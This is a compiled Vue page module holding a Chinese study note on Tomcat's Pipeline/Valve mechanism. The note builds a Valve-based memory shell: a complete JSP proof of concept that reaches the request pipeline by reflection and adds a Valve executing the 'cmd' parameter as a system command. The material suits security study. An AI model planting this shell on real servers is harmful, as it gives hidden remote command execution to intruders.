import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as n,o as e}from"./app-DS0ZCcmM.js";const l={};function t(p,s){return e(),a("div",null,s[0]||(s[0]=[n(`<h1 id="valve" tabindex="-1"><a class="header-anchor" href="#valve"><span>Valve</span></a></h1><h2 id="valve-1" tabindex="-1"><a class="header-anchor" href="#valve-1"><span>Valve</span></a></h2><h3 id="tomcat管道机制" tabindex="-1"><a class="header-anchor" href="#tomcat管道机制"><span>Tomcat管道机制</span></a></h3><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710102242131.png" alt="image-20240710102242131" tabindex="0" loading="lazy"><figcaption>image-20240710102242131</figcaption></figure><p>Tomcat中定义了两个接口Pipline和valve,valve可以作为pipline的子单位，用于处理传入请求和传出请求</p><p>Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成一个处理管道。每个Valve负责在请求处理过程中执行特定的任务，例如认证、日志记录、安全性检查等。这样，请求就会在管道中依次经过每个Valve，每个Valve都可以对请求进行处理或者传递给下一个Valve</p><p>Tomcat每个层级的容器（Engine、Host、Context、Wrapper）都有相对应的实现Valve对象（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），这些Valve同时维护一个Pipeline实例（StandardPipeline）。在每个层级容器中的管道中都有至少有一个Valve，称之为基础阀，其作用是连接当前容器的下一个容器</p><h4 id="valve接口" tabindex="-1"><a class="header-anchor" href="#valve接口"><span>Valve接口</span></a></h4><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">package</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;"> org.apache.catalina</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> java.io.IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.Request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.Response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> interface</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> Valve</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 获取下一个阀门</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> Valve</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getNext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 设置下一个阀门</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> setNext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Valve</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> valve</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 后台执行逻辑，主要在类加载上下文中使用到</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> backgroundProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 执行业务逻辑</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> invoke</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Request</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Response</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 是否异步执行</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> boolean</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> isAsyncSupported</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>实现类是ValveBase抽象类</p><h4 id="pipline接口" tabindex="-1"><a class="header-anchor" href="#pipline接口"><span>Pipline接口</span></a></h4><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710104540060.png" alt="image-20240710104540060" tabindex="0" loading="lazy"><figcaption>image-20240710104540060</figcaption></figure><p>get/set方法用于设置基础阀，通过提供add方法添加阀，remove方法删除阀。StandardPipeline是Tomcat中Pipeline的实现类</p><h3 id="自定义valve" tabindex="-1"><a class="header-anchor" href="#自定义valve"><span>自定义Valve</span></a></h3><p>通过继承ValveBase抽象类，只需要我们重写invoke方法，实现具体的业务逻辑即可</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">package</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;"> org.example.javaweb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.Request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.Response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.valves.ValveBase</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> java.io.IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> Valvetest</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> extends</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ValveBase</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> invoke</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Request</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Response</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">out</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;valve test&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        //继续调用下一个valve</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        getNext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">invoke</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(request,response);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="内存马实现" tabindex="-1"><a class="header-anchor" href="#内存马实现"><span>内存马实现</span></a></h3><p>StandardPipline#addvalve使我们可以向当前管道当中添加valve</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710142837176.png" alt="image-20240710142837176" tabindex="0" loading="lazy"><figcaption>image-20240710142837176</figcaption></figure><p>消息传递到connector被解析之后，继续调用最终获取到了StandardPipline对象</p><p>具体流程：</p><p>1.获取StandardContext对象</p><p>2.通过1来获取StandardPipline对象</p><p>3.编写恶意valve并加载</p><ul><li><p>1-2</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>    //获取Pipline对象</span></span>
<span class="line"><span>    Pipeline pipeline =  standardContext.getPipeline();</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>3</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    class Shell_valve extends ValveBase{</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void invoke(Request request, Response response){</span></span>
<span class="line"><span>            String cmd = request.getParameter(&quot;cmd&quot;);</span></span>
<span class="line"><span>            try{</span></span>
<span class="line"><span>                Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>            } catch (IOException e) {</span></span>
<span class="line"><span>                throw new RuntimeException(e);</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    Shell_valve shellValve = new Shell_valve();</span></span>
<span class="line"><span>    pipeline.addValve(shellValve);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h3 id="完整poc" tabindex="-1"><a class="header-anchor" href="#完整poc"><span>完整POC</span></a></h3><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%--</span></span>
<span class="line"><span>  Created by IntelliJ IDEA.</span></span>
<span class="line"><span>  User: Administrator</span></span>
<span class="line"><span>  Date: 2024/7/10</span></span>
<span class="line"><span>  Time: 14:32</span></span>
<span class="line"><span>  To change this template use File | Settings | File Templates.</span></span>
<span class="line"><span>--%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>    //获取Pipline对象</span></span>
<span class="line"><span>    Pipeline pipeline =  standardContext.getPipeline();</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    class Shell_valve extends ValveBase{</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void invoke(Request request, Response response){</span></span>
<span class="line"><span>            String cmd = request.getParameter(&quot;cmd&quot;);</span></span>
<span class="line"><span>            try{</span></span>
<span class="line"><span>                Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>            } catch (IOException e) {</span></span>
<span class="line"><span>                throw new RuntimeException(e);</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    Shell_valve shellValve = new Shell_valve();</span></span>
<span class="line"><span>    pipeline.addValve(shellValve);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果如图</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710144413346.png" alt="image-20240710144413346" tabindex="0" loading="lazy"><figcaption>image-20240710144413346</figcaption></figure>`,29)]))}const h=i(l,[["render",t],["__file","Valve.html.vue"]]),c=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Valve.html","title":"Valve","lang":"zh-CN","frontmatter":{"description":"Valve Valve Tomcat管道机制 image-20240710102242131image-20240710102242131 Tomcat中定义了两个接口Pipline和valve,valve可以作为pipline的子单位，用于处理传入请求和传出请求 Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Valve.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Valve"}],["meta",{"property":"og:description","content":"Valve Valve Tomcat管道机制 image-20240710102242131image-20240710102242131 Tomcat中定义了两个接口Pipline和valve,valve可以作为pipline的子单位，用于处理传入请求和传出请求 Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710102242131.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Valve\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710102242131.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710104540060.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710142837176.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710144413346.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"Valve","slug":"valve-1","link":"#valve-1","children":[{"level":3,"title":"Tomcat管道机制","slug":"tomcat管道机制","link":"#tomcat管道机制","children":[]},{"level":3,"title":"自定义Valve","slug":"自定义valve","link":"#自定义valve","children":[]},{"level":3,"title":"内存马实现","slug":"内存马实现","link":"#内存马实现","children":[]},{"level":3,"title":"完整POC","slug":"完整poc","link":"#完整poc","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":2.76,"words":828},"filePathRelative":"Java学习/内存马/Tomcat/Valve.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>Valve</h2>\\n<h3>Tomcat管道机制</h3>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710102242131.png\\" alt=\\"image-20240710102242131\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240710102242131</figcaption></figure>\\n<p>Tomcat中定义了两个接口Pipline和valve,valve可以作为pipline的子单位，用于处理传入请求和传出请求</p>","autoDesc":true}');export{h as comp,c as data};
